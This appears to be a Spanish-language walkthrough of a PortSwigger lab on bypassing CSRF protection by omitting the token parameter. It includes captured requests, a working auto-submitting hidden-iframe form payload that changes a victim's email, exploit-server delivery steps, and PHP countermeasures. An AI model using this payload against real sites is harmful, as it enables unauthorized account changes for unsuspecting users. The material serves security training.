# PortSwigger Lab: CSRF where token validation depends on token being present

**Plataforma:** PortSwigger Web Security Academy  
**Dificultad:** Fácil  
**Tipo:** CSRF (Cross-Site Request Forgery)  
**Objetivo:** Cambiar email explotando validación CSRF condicional

---

## Flujo del ataque

```
Login (wiener:peter) → Capturar petición con token CSRF
→ Modificar token → Falla validación
→ Eliminar parámetro csrf → Petición aceptada
→ Crear payload sin token → Desplegar en exploit server
→ Enviar a víctima → Email cambiado
```

---

## 1. Acceso al laboratorio

```
Usuario: wiener
Contraseña: peter
```

---

## 2. Análisis de la vulnerabilidad

### Captura de petición

```http
POST /my-account/change-email HTTP/2
Host: 0afb00780357a10180bf036300be00c0.web-security-academy.net
Cookie: session=RuzplKEPvSRPQxpt5kmcnzRCnJN1jhZ1
Content-Type: application/x-www-form-urlencoded

email=awdaw%40fawda&csrf=ZK3xVwj5UBOJytdiojrzIPF8ayPLJHYJ
```

Petición incluye un parámetro `csrf` con token. Diferencia con Lab 1: aquí SÍ hay token.

### Prueba 1: Modificar el token

```
email=test%40fawda&csrf=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**Resultado:**

```
HTTP/2 400 Bad Request
"Invalid CSRF token"
```

El servidor valida cuando el token está presente.

### Prueba 2: Eliminar el parámetro CSRF

```http
POST /my-account/change-email HTTP/2
...

email=test%40fawda
```

**Resultado:**

```
HTTP/2 302 Found
Location: /my-account
```

El servidor acepta la petición sin token. Email se cambia correctamente.

---

## Vulnerabilidad identificada

| Factor | Detalle |
|--------|---------|
| Validación condicional | Solo valida si `csrf` está presente |
| Lógica defectuosa | No rechaza sin token, simplemente omite validación |
| Bypass trivial | Eliminar parámetro evade defensas |
| Impacto | CSRF sin token |

---

## 3. Crafting del payload CSRF

Omitiendo el parámetro `csrf`, el payload solo envía `email`:

```html
<iframe name="csrf-frame" style="display:none;"></iframe>
<form method="POST" 
      action="https://0afb00780357a10180bf036300be00c0.web-security-academy.net/my-account/change-email" 
      target="csrf-frame">
  <input type="hidden" name="email" value="hacked@hacked.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

**Desglose:**

| Elemento | Función |
|----------|---------|
| `<iframe>` oculto | Recibe respuesta sin recargar página |
| `<form method="POST">` | Petición POST al endpoint |
| `target="csrf-frame"` | Dirige respuesta al iframe |
| `name="email"` | Único parámetro — **no incluye csrf** |
| `document.forms[0].submit()` | Auto-envía |

La cookie de sesión de la víctima se adjunta automáticamente.

---

## 4. Comparación con Lab anterior

| Aspecto | Lab 1 (No defenses) | Lab 2 (Token conditional) |
|--------|-------------------|-------------------------|
| Token CSRF | No existe | Existe pero validación condicional |
| Sin parámetro csrf | Funciona | Funciona (omite validación) |
| Con parámetro modificado | N/A | Falla (valida si presente) |
| Complejidad | Trivial | Requiere análisis |
| Bypass | Directo | Eliminar parámetro |

---

## 5. Despliegue en exploit server

1. Acceder exploit server
2. Pegar payload HTML en Body
3. Click Store
4. Click View exploit (verifica auto-envío)
5. Click Deliver exploit to victim

Resultado: Email de víctima cambiado.

---

## Por qué funciona

| Factor | Razón |
|--------|-------|
| Lógica OR invertida | Valida SOLO si csrf está presente |
| Sin validación obligatoria | No rechaza sin csrf |
| Presunción defectuosa | Asume sin parámetro = sin validación necesaria |
| Cookie automática | Navegador incluye sesión |
| Mismo dominio | iframe y form heredan contexto |

---

## Contramedidas (no implementadas)

```php
// CORRECTO: Rechazar si token NO está O es inválido
if (!isset($_POST['csrf']) || !validate_csrf_token($_POST['csrf'])) {
    die("CSRF token required");
}

// INCORRECTO (lab actual):
if (isset($_POST['csrf']) && !validate_csrf_token($_POST['csrf'])) {
    die("Invalid token");  // Si csrf no existe, pasa
}

// SameSite Cookie
Set-Cookie: session=...; SameSite=Strict
```

---

## Referencias

- [PortSwigger — CSRF token validation bypass](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [OWASP — CSRF](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger Academy](https://portswigger.net/web-security/lab)
